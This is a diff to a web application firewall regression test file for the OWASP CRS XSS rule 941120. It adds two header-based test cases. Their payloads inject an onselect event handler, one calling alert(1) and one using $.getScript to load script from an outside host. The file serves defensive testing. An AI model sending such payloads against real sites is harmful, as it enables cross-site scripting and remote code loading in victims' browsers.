@@ -1,6 +1,6 @@
 ---
 meta:
-  author: "Christian S.J. Peron, Walter Hop, azurit"
+  author: "Christian S.J. Peron, Walter Hop, azurit, touchweb_vincent"
 rule_id: 941120
 tests:
   - test_id: 1
@@ -132,3 +132,37 @@ tests:
         output:
           log:
             no_expect_ids: [941120]
+  - test_id: 9
+    desc: "Test on HTTP header"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            Remote-ip: "' onselect=alert(1) '"
+          method: GET
+          port: 80
+          uri: "/get"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [941120]
+  - test_id: 10
+    desc: "Test on HTTP header"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            Remote-ip: "' onselect=$.getScript('//test.com') '"
+          method: GET
+          port: 80
+          uri: "/get"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [941120]
